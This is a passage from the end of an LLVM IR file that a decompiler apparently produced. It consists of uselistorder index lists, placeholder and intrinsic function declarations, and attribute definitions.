127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 66, 142, 64, 65, 67, 143, 146, 147, 148, 149, 150, 151, 144, 145, 92, 93, 94, 52, 53, 152, 153, 154, 155, 156, 158, 159, 54, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 182, 183, 184, 185, 186, 187, 188, 12, 189, 190, 191, 192, 193, 194, 195, 230, 231, 7, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 214, 215, 216, 217, 222, 223, 224, 225, 232, 233, 234, 242, 256, 59, 51 }
  uselistorder void (i32)* @__pseudo_branch, { 1, 68, 61, 62, 63, 64, 65, 66, 67, 69, 70, 71, 72, 17, 18, 19, 20, 21, 22, 13, 14, 15, 16, 23, 24, 25, 26, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 27, 28, 29, 73, 78, 79, 80, 81, 82, 83, 84, 74, 88, 89, 90, 91, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 39, 75, 76, 77, 85, 86, 87, 40, 41, 42, 0, 36, 37, 38, 43, 47, 48, 44, 45, 46, 92, 30, 31, 32, 33, 34, 35, 59, 60 }
  uselistorder i32 0, { 443, 442, 506, 507, 1408, 447, 446, 508, 1409, 1410, 1411, 1412, 388, 387, 509, 1413, 1414, 210, 1415, 1417, 1418, 153, 154, 1419, 1420, 1416, 97, 98, 99, 100, 2, 1, 3, 0, 199, 198, 200, 201, 202, 1421, 444, 445, 147, 142, 1422, 1423, 204, 205, 203, 206, 1424, 1425, 1426, 1427, 209, 208, 207, 1428, 1429, 1430, 433, 432, 510, 448, 511, 449, 512, 450, 513, 514, 515, 155, 1431, 464, 463, 1432, 1433, 462, 461, 1434, 516, 459, 460, 457, 458, 456, 455, 1435, 454, 453, 452, 451, 396, 1436, 1452, 1437, 213, 1438, 1439, 1440, 1441, 1442, 1443, 215, 1445, 1446, 211, 212, 1447, 1448, 131, 156, 1449, 1450, 708, 101, 102, 434, 435, 214, 1444, 1451, 395, 1453, 517, 518, 1454, 466, 465, 216, 1455, 1456, 217, 1457, 1458, 1459, 113, 519, 520, 1460, 218, 1461, 157, 1462, 1463, 219, 1464, 1465, 1466, 1467, 1468, 1469, 1470, 1471, 1472, 1473, 39, 132, 521, 1474, 220, 1475, 1476, 1477, 4, 1478, 1479, 5, 1480, 1481, 927, 928, 6, 148, 1482, 522, 1483, 841, 842, 843, 844, 845, 849, 846, 847, 848, 7, 397, 103, 850, 523, 851, 852, 853, 467, 468, 929, 930, 8, 524, 786, 525, 1484, 1485, 1486, 9, 10, 158, 159, 160, 1501, 1502, 11, 787, 161, 162, 1319, 1320, 1321, 1322, 221, 222, 1323, 796, 223, 133, 49, 1503, 104, 398, 1507, 1508, 50, 854, 114, 855, 856, 857, 399, 163, 1504, 1505, 1506, 400, 12, 1509, 1510, 1511, 1512, 1513, 1516, 1517, 1518, 1519, 1520, 1521, 1522, 1523, 1524, 1525, 1514, 1515, 1526, 1527, 1528, 1529, 1530, 1531, 1532, 1533, 40, 1534, 1535, 1536, 1537, 1538, 41, 1539, 1540, 1541, 42, 1542, 1543, 1544, 43, 1545, 1546, 1547, 1548, 1549, 1550, 1551, 1552, 1553, 1554, 1555, 1556, 1557, 1558, 1559, 1560, 1561, 1562, 1563, 1564, 1565, 1566, 1567, 1568, 1571, 1572, 1573, 1574, 1575, 1576, 1577, 1569, 1570, 1578, 1579, 1580, 1581, 1582, 1583, 1584, 1585, 1586, 1587, 44, 1588, 1589, 1590, 1591, 1592, 45, 1593, 1594, 1595, 1596, 1597, 46, 1598, 1599, 1600, 1601, 1602, 1603, 1604, 1605, 1606, 1607, 1608, 1609, 1610, 1611, 1612, 224, 858, 709, 859, 860, 861, 862, 896, 526, 527, 897, 898, 164, 165, 166, 228, 863, 226, 864, 885, 878, 710, 879, 880, 881, 882, 51, 52, 117, 883, 884, 401, 886, 887, 711, 888, 225, 889, 53, 54, 116, 890, 891, 712, 892, 893, 55, 56, 115, 894, 227, 895, 167, 865, 713, 866, 867, 528, 868, 869, 714, 870, 871, 874, 872, 873, 402, 875, 57, 58, 119, 876, 715, 59, 60, 118, 877, 899, 716, 900, 901, 902, 903, 904, 905, 717, 906, 907, 908, 909, 789, 788, 405, 791, 792, 790, 403, 404, 793, 794, 529, 795, 797, 798, 718, 799, 800, 801, 719, 802, 803, 61, 62, 120, 804, 805, 806, 105, 106, 807, 808, 809, 229, 810, 811, 812, 813, 814, 530, 815, 816, 817, 818, 819, 820, 168, 823, 720, 824, 825, 63, 64, 122, 826, 827, 828, 721, 829, 830, 831, 832, 722, 833, 834, 65, 66, 121, 835, 836, 837, 838, 839, 230, 232, 821, 231, 822, 233, 840, 169, 910, 915, 916, 911, 912, 913, 918, 919, 920, 234, 921, 922, 923, 924, 925, 914, 917, 926, 170, 931, 932, 933, 531, 1058, 532, 934, 1487, 1488, 1489, 235, 1490, 1383, 1382, 1327, 1300, 1229, 936, 935, 937, 1059, 1060, 1061, 1613, 1614, 1615, 1616, 236, 1617, 1618, 1619, 1328, 1329, 430, 431, 533, 1624, 726, 1625, 534, 1626, 1627, 535, 1628, 1629, 724, 237, 407, 1630, 725, 1631, 536, 107, 1632, 1633, 537, 1648, 1649, 1652, 723, 406, 1653, 469, 172, 171, 1650, 1651, 1620, 1621, 727, 238, 389, 776, 13, 14, 1644, 1102, 955, 1643, 1278, 1384, 143, 240, 1385, 728, 239, 1386, 1387, 1634, 1635, 1636, 1637, 538, 1638, 173, 1032, 1033, 67, 68, 123, 1388, 1389, 112, 409, 1393, 1390, 1391, 729, 1392, 1394, 730, 1395, 1396, 1397, 1398, 69, 70, 124, 1399, 241, 1400, 1401, 1402, 1404, 1403, 408, 777, 779, 778, 242, 780, 781, 782, 539, 783, 174, 1622, 1623, 1034, 1035, 1036, 1037, 1038, 1039, 244, 175, 1040, 1041, 1042, 144, 243, 1043, 176, 541, 542, 1639, 540, 177, 178, 1335, 1336, 1337, 1338, 1339, 245, 1340, 1341, 1342, 1343, 1344, 1345, 246, 1330, 543, 1331, 1332, 544, 1333, 1334, 179, 731, 247, 248, 1301, 545, 249, 1302, 1303, 1304, 1305, 1306, 258, 250, 252, 254, 251, 257, 253, 255, 259, 256, 1346, 1347, 1371, 1372, 180, 1348, 1349, 263, 261, 262, 1350, 1351, 269, 268, 194, 260, 1352, 1353, 1354, 1355, 1356, 1357, 437, 436, 470, 546, 1358, 1359, 1360, 108, 1361, 265, 264, 266, 267, 193, 1362, 1363, 410, 1364, 1365, 151, 1366, 1367, 1368, 1369, 1370, 15, 16, 956, 957, 109, 17, 471, 547, 1279, 1280, 1282, 1281, 1254, 1253, 1231, 1230, 959, 958, 1044, 960, 961, 1256, 1255, 1257, 963, 962, 1324, 1654, 1655, 125, 181, 1062, 1063, 1064, 270, 938, 939, 182, 271, 1065, 1070, 1071, 1072, 1073, 272, 1066, 273, 1067, 1068, 1074, 1045, 548, 1232, 1640, 1641, 1642, 964, 966, 965, 1075, 967, 1405, 968, 969, 970, 1645, 1646, 1647, 1069, 18, 1491, 1492, 1493, 149, 1494, 1495, 1496, 1497, 1498, 274, 1499, 732, 735, 733, 734, 1500, 736, 195, 275, 1076, 1077, 145, 424, 1078, 1079, 737, 19, 411, 276, 277, 278, 71, 279, 549, 971, 1080, 1081, 1082, 1309, 1308, 1310, 1311, 1312, 1313, 47, 280, 1314, 1315, 1316, 281, 134, 135, 504, 505, 940, 283, 282, 284, 1083, 285, 1084, 1085, 286, 1373, 1374, 550, 287, 1086, 288, 289, 1133, 290, 1103, 978, 972, 293, 973, 551, 974, 552, 768, 756, 757, 742, 758, 743, 759, 760, 744, 761, 745, 762, 746, 763, 747, 764, 765, 136, 72, 392, 393, 766, 748, 767, 769, 770, 771, 772, 773, 291, 292, 774, 775, 975, 738, 976, 553, 977, 413, 412, 979, 980, 981, 982, 295, 294, 983, 984, 985, 749, 390, 986, 126, 127, 391, 987, 128, 129, 554, 989, 990, 739, 991, 992, 993, 994, 995, 555, 996, 997, 425, 426, 196, 741, 998, 999, 1000, 1001, 1002, 1003, 740, 1004, 1005, 556, 1006, 557, 1007, 1010, 1011, 1012, 296, 1008, 297, 1009, 298, 988, 941, 942, 943, 138, 73, 944, 137, 74, 945, 946, 558, 947, 559, 948, 560, 949, 950, 952, 299, 300, 951, 427, 75, 130, 438, 953, 301, 20, 954, 394, 1104, 1105, 1013, 561, 1014, 1016, 302, 1017, 1018, 1019, 1020, 1021, 1022, 1023, 304, 303, 1024, 562, 1025, 563, 1026, 564, 1015, 1027, 439, 1030, 565, 1031, 784, 566, 1028, 1029, 567, 309, 308, 750, 183, 311, 310, 751, 184, 313, 312, 752, 185, 315, 314, 753, 186, 317, 316, 754, 187, 755, 307, 306, 305, 415, 428, 416, 417, 418, 419, 568, 1046, 318, 319, 1054, 1047, 1048, 1049, 1050, 1051, 1052, 1053, 414, 1055, 1056, 76, 1057, 320, 569, 146, 1087, 1088, 1089, 1090, 422, 1091, 1092, 1093, 421, 1094, 1095, 1096, 1097, 321, 1098, 1100, 1099, 188, 189, 322, 420, 324, 323, 1101, 325, 326, 110, 327, 330, 1106, 1107, 1108, 1109, 329, 328, 331, 1110, 1111, 77, 78, 197, 150, 332, 111, 571, 1112, 1113, 1114, 1115, 1116, 333, 1117, 1118, 474, 1119, 1120, 1121, 1122, 337, 334, 335, 336, 1123, 1124, 1125, 1126, 572, 1127, 1128, 473, 1129, 570, 1130, 472, 1131, 573, 1132, 339, 1134, 1135, 1136, 1137, 338, 340, 1138, 1139, 79, 80, 139, 1140, 341, 1141, 1142, 477, 1143, 475, 1144, 476, 1145, 345, 1147, 1148, 1149, 1150, 344, 343, 346, 1151, 1152, 81, 82, 1146, 342, 1153, 1154, 347, 1155, 1156, 480, 1157, 479, 1158, 478, 1159, 574, 1160, 576, 140, 83, 1161, 190, 481, 577, 1162, 1163, 348, 349, 1164, 575, 1165, 352, 1166, 1167, 1168, 1169, 351, 350, 353, 1170, 1171, 84, 85, 191, 1172, 1173, 21, 22, 23, 24, 1174, 1175, 354, 483, 1176, 578, 1177, 579, 1178, 580, 1179, 581, 1180, 582, 1181, 583, 1182, 482, 1183, 358, 1185, 1186, 1187, 1188, 356, 355, 359, 1189, 1190, 86, 87, 1184, 357, 1192, 1191, 25, 26, 27, 28, 1193, 360, 1194, 1195, 485, 1196, 584, 1197, 585, 1198, 586, 1199, 587, 1200, 588, 1201, 589, 1202, 484, 1203, 590, 1204, 364, 1206, 1207, 1208, 1209, 362, 361, 365, 1210, 1211, 88, 89, 1205, 363, 1212, 90, 591, 1213, 1215, 1216, 1217, 1218, 592, 1219, 29, 30, 31, 32, 33, 1214, 366, 1220, 1221, 491, 1222, 490, 1223, 489, 1224, 488, 1225, 486, 1226, 487, 1227, 593, 1228, 370, 1234, 1235, 1236, 1237, 368, 367, 371, 1238, 1239, 91, 92, 1233, 369, 1240, 93, 594, 1241, 1243, 1244, 1245, 1246, 595, 1247, 34, 35, 36, 37, 38, 1242, 372, 1248, 1249, 493, 1250, 492, 1251, 596, 1252, 598, 141, 94, 1258, 192, 494, 599, 600, 1259, 1260, 373, 374, 1261, 597, 1264, 1265, 1266, 376, 377, 1267, 1268, 95, 1262, 1263, 375, 1270, 1269, 1271, 378, 1272, 1273, 497, 1274, 496, 1275, 495, 1276, 601, 1277, 1284, 1285, 1286, 380, 381, 382, 1288, 1289, 96, 1287, 1283, 379, 1291, 1292, 1290, 1293, 383, 1294, 1295, 500, 1296, 499, 1297, 498, 1298, 602, 1299, 440, 1307, 1317, 384, 1318, 1325, 385, 1326, 1375, 152, 1376, 1377, 441, 603, 423, 1378, 1379, 48, 429, 1380, 1381, 604, 1406, 386, 1407, 501, 785, 502, 503, 605, 606, 607, 608, 609, 610, 611, 612, 613, 614, 615, 616, 617, 618, 619, 620, 621, 622, 623, 624, 625, 626, 627, 628, 629, 630, 631, 632, 633, 634, 635, 636, 637, 638, 639, 640, 641, 642, 643, 644, 645, 646, 647, 648, 649, 650, 651, 652, 653, 654, 655, 656, 657, 658, 659, 660, 661, 662, 663, 664, 665, 666, 667, 668, 669, 670, 671, 672, 673, 674, 675, 676, 677, 678, 679, 680, 681, 682, 683, 684, 685, 686, 687, 688, 689, 690, 691, 692, 693, 694, 695, 696, 697, 698, 699, 700, 701, 702, 703, 704, 705, 706, 707, 1656, 1657, 1658, 1659, 1660, 1661, 1662, 1663, 1664, 1665, 1666, 1667, 1668, 1669, 1670 }
  uselistorder i32* @r4, { 88, 841, 842, 843, 844, 845, 863, 846, 847, 848, 849, 850, 851, 852, 853, 854, 855, 856, 857, 858, 859, 10, 860, 861, 862, 864, 865, 866, 867, 868, 869, 870, 871, 95, 96, 97, 98, 141, 11, 142, 143, 144, 12, 145, 146, 147, 148, 149, 150, 151, 0, 13, 152, 153, 154, 155, 156, 157, 158, 159, 218, 219, 872, 89, 90, 91, 874, 875, 876, 5, 879, 60, 873, 760, 761, 99, 100, 101, 102, 103, 104, 105, 106, 107, 880, 881, 160, 161, 14, 4, 162, 882, 883, 884, 885, 886, 887, 888, 889, 890, 891, 892, 893, 894, 895, 896, 897, 15, 163, 164, 165, 166, 167, 168, 169, 170, 189, 16, 190, 191, 171, 172, 174, 17, 175, 178, 18, 179, 180, 19, 181, 182, 20, 183, 184, 21, 185, 186, 22, 187, 57, 188, 173, 192, 23, 193, 194, 195, 196, 197, 198, 199, 176, 177, 92, 93, 94, 108, 109, 110, 111, 24, 112, 25, 26, 113, 114, 115, 116, 117, 118, 119, 124, 125, 27, 126, 127, 28, 128, 129, 29, 130, 131, 30, 132, 133, 31, 134, 135, 32, 136, 137, 120, 121, 122, 123, 138, 139, 140, 200, 201, 202, 33, 203, 204, 205, 34, 206, 207, 208, 209, 210, 211, 55, 212, 213, 214, 215, 216, 217, 220, 221, 222, 223, 380, 224, 877, 878, 823, 824, 825, 826, 827, 828, 724, 725, 381, 382, 898, 899, 900, 765, 766, 59, 903, 56, 904, 905, 906, 922, 924, 925, 926, 923, 907, 912, 920, 921, 901, 913, 914, 915, 916, 61, 829, 830, 6, 35, 831, 36, 832, 833, 834, 908, 909, 835, 79, 80, 81, 82, 83, 84, 902, 910, 911, 225, 226, 227, 228, 767, 771, 772, 773, 774, 775, 776, 777, 778, 779, 780, 781, 782, 37, 783, 784, 785, 786, 768, 769, 770, 726, 727, 728, 729, 730, 731, 732, 733, 734, 38, 735, 736, 737, 738, 739, 740, 741, 742, 743, 787, 809, 810, 788, 789, 790, 791, 792, 793, 794, 795, 796, 797, 798, 799, 800, 58, 801, 802, 1, 803, 804, 805, 806, 807, 808, 248, 249, 250, 62, 695, 696, 697, 698, 699, 702, 703, 704, 63, 700, 701, 653, 654, 655, 656, 657, 658, 659, 604, 605, 606, 609, 610, 611, 607, 608, 251, 252, 253, 254, 255, 256, 257, 64, 258, 259, 660, 661, 662, 663, 664, 665, 666, 260, 261, 262, 263, 264, 265, 65, 383, 384, 385, 386, 387, 388, 389, 229, 230, 231, 390, 391, 392, 393, 9, 394, 395, 396, 397, 398, 399, 400, 266, 267, 268, 271, 272, 273, 269, 270, 274, 275, 276, 277, 278, 279, 917, 918, 919, 280, 281, 282, 401, 402, 403, 404, 405, 283, 284, 285, 286, 287, 288, 289, 290, 464, 423, 424, 77, 78, 291, 292, 293, 294, 68, 69, 66, 67, 70, 71, 72, 73, 74, 75, 76, 295, 296, 297, 298, 299, 300, 301, 302, 303, 304, 305, 306, 307, 308, 313, 314, 315, 316, 323, 324, 325, 326, 327, 7, 317, 318, 319, 320, 321, 322, 309, 310, 311, 312, 232, 233, 234, 235, 236, 237, 238, 239, 240, 241, 242, 243, 244, 245, 246, 247, 705, 425, 426, 427, 428, 429, 328, 329, 330, 331, 332, 333, 334, 335, 336, 337, 338, 339, 340, 347, 348, 349, 350, 351, 352, 85, 86, 341, 342, 343, 344, 345, 346, 353, 39, 40, 41, 42, 43, 44, 354, 355, 356, 357, 358, 359, 360, 361, 362, 363, 364, 365, 366, 367, 368, 369, 370, 371, 372, 373, 374, 375, 376, 377, 378, 379, 406, 407, 8, 408, 409, 410, 411, 412, 413, 414, 415, 416, 417, 418, 419, 420, 421, 422, 430, 431, 432, 433, 434, 435, 436, 437, 438, 439, 440, 441, 442, 443, 444, 445, 446, 447, 448, 449, 450, 451, 452, 453, 454, 455, 456, 457, 458, 459, 460, 461, 462, 463, 465, 466, 467, 468, 469, 470, 471, 472, 473, 474, 475, 476, 477, 478, 479, 480, 481, 45, 482, 483, 484, 485, 486, 487, 488, 489, 490, 491, 492, 493, 494, 495, 496, 497, 498, 499, 500, 501, 2, 502, 503, 504, 505, 506, 507, 508, 509, 46, 510, 47, 511, 48, 512, 513, 514, 515, 516, 517, 518, 519, 520, 521, 522, 523, 524, 525, 526, 527, 528, 529, 530, 531, 532, 533, 534, 535, 49, 536, 50, 537, 51, 538, 52, 539, 540, 541, 542, 543, 544, 545, 546, 547, 548, 549, 550, 551, 552, 553, 554, 555, 556, 557, 558, 559, 560, 561, 562, 53, 563, 564, 565, 566, 567, 568, 569, 570, 571, 572, 573, 574, 575, 576, 577, 578, 579, 580, 581, 582, 583, 584, 585, 586, 587, 588, 589, 590, 591, 592, 593, 594, 595, 596, 597, 598, 599, 600, 601, 602, 603, 54, 612, 613, 614, 615, 616, 617, 618, 619, 620, 621, 622, 623, 624, 625, 626, 627, 628, 629, 630, 631, 632, 633, 634, 635, 636, 637, 638, 639, 640, 641, 642, 643, 644, 645, 646, 647, 648, 649, 650, 651, 652, 667, 668, 669, 3, 670, 671, 672, 673, 674, 675, 676, 677, 678, 679, 680, 681, 682, 683, 684, 685, 686, 687, 688, 689, 690, 691, 692, 693, 694, 706, 707, 708, 709, 710, 711, 712, 713, 714, 715, 716, 717, 718, 719, 720, 721, 722, 723, 744, 745, 746, 747, 748, 749, 750, 751, 752, 753, 754, 755, 756, 757, 758, 759, 762, 763, 764, 811, 812, 815, 813, 814, 816, 817, 818, 819, 820, 821, 822, 836, 837, 838, 839, 87, 840 }
}

declare i32 @__libc_errno() local_unnamed_addr

declare i32 @__decompiler_undefined_function_0() local_unnamed_addr

declare i8 @__decompiler_undefined_function_1() local_unnamed_addr

declare i16* @__decompiler_undefined_function_2() local_unnamed_addr

declare i16 @__decompiler_undefined_function_3() local_unnamed_addr

declare i8* @__decompiler_undefined_function_4() local_unnamed_addr

declare %vfp_regs @__decompiler_undefined_function_5() local_unnamed_addr

declare %anon_struct_4 @__decompiler_undefined_function_6() local_unnamed_addr

declare %anon_struct_13.3 @__decompiler_undefined_function_7() local_unnamed_addr

declare %anon_struct_13 @__decompiler_undefined_function_8() local_unnamed_addr

; Function Attrs: nounwind readnone
declare i32 @llvm.bswap.i32(i32) #1

; Function Attrs: noreturn nounwind
declare void @llvm.trap() #2

; Function Attrs: nounwind readnone
declare i16 @llvm.bswap.i16(i16) #1

declare float @fabsf(float)

attributes #0 = { noreturn }
attributes #1 = { nounwind readnone }
attributes #2 = { noreturn nounwind }
